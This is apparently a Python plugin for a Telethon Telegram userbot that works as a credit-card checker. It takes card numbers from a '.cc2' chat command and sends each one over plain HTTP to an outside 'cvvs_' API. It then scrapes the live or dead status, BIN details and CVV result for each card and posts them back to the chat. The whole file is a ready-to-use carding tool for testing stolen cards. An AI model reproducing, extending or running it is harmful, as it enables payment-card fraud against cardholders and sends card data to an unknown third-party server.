""" CC checker userbot plugin coded by @scifidemon and API by @Dr34m_C4t"""
from telethon import events, errors, functions, types
import asyncio
from requests import get
from bs4 import BeautifulSoup

@command(pattern="^.cc2")
async def _(event):
    if event.fwd_from:
        return
    cclist = event.text.split(" ")
    n = len(cclist)
    final_result = ""
    await event.edit("Checking...")
    for i in range(1,n):
        cc = cclist[i]
        URL = f"http://thetechrim.tech/cvvs_/apielo.php?lista={cc}"
        r = get(URL)
        soup = BeautifulSoup(r.text,"html.parser")
        all_stats = soup.find_all("span")
        status = f"Status: {all_stats[0].text}\n"
        card = "Card: "+ f"`{all_stats[1].text}`\n"
        bin_details = f"BIN Details: {all_stats[2].text}\n"
        cvv_status = f"CC Status: {all_stats[4].text}\n"
        badge = "ᏆhᎬ ᏆᎬᏟhᏒᎥm\n\n"
        result = status+card+bin_details+cvv_status+badge
        final_result = final_result+result
        final_num = i
        await event.edit(final_result+"Checking More...\n")
    await event.edit(final_result+f"{final_num} CCs Checked!\nCC checker API by @Dr34m_C4t\nCC checker UserBot plugin by @scifidemon\n")
        




